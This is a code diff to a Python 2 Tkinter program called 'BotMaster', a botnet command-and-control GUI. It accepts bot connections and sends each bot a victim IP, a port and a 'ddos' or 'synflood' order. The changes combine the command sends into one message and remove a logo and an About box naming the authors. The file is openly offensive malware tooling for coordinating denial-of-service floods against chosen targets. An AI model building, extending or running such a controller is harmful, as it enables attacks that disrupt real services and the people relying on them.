@@ -1,7 +1,6 @@
 from socket import *
 import subprocess, os, sys, time, threading
 from Tkinter import *
-from PIL import ImageTk, Image
 from ttk import *
 import tkMessageBox
 
@@ -47,10 +46,7 @@ def DDOS():
 	victimPort= E3.get()
 	for item in allConnections:
 		try:
-			item.send(victimIp)
-			item.send(b" ")
-			item.send(victimPort)
-			item.send(b" ddos")
+			item.send(victimIp+" "+victimPort+" ddos")
 		except:
 			pass
 			
@@ -59,18 +55,12 @@ def syn_Flood():
 	victimPort = E3.get()
 	for item in allConnections:
 		try:
-			item.send(victimIp)
-			item.send(b" ")
-			item.send(victimPort)
-			item.send(b" synflood")
+			item.send(victimIp+" "+victimPort+" synflood")
 		except:
 			pass
 
 def help():
 	tkMessageBox.showinfo("Directions", "Click Accept bots to accept connections and click an attack!")
-
-def about():
-	tkMessageBox.showinfo("About", "Created by Antonis Manaras, Christos Tsogidis, Vasilis Kouliaridis")
 				
 #Creates the window
 root = Tk()
@@ -79,14 +69,6 @@ root = Tk()
 root.resizable(width=False, height=False)
 root.title("BotMaster")
 root.geometry("700x260")
-
-
-#Setting the logo
-img = ImageTk.PhotoImage(Image.open("static/img/logo.jpg"))
-
-#Displaying the logo
-panel = Label(root, image = img)
-panel.grid(row=9,column=0,columnspan=6,rowspan=6,sticky="s")
 
 #Separator line
 Separator(root,orient=HORIZONTAL).grid(row=3,columnspan=7,sticky="nsew")#first separator between textbox and label
@@ -120,7 +102,6 @@ menubar.add_cascade(label="Window", menu=windowmenu)
 
 helpmenu = Menu(menubar, tearoff=0)
 helpmenu.add_command(label="Help", command=help)
-helpmenu.add_command(label="About...", command=about)
 menubar.add_cascade(label="Help", menu=helpmenu)
 
 #Constructing the Header Label
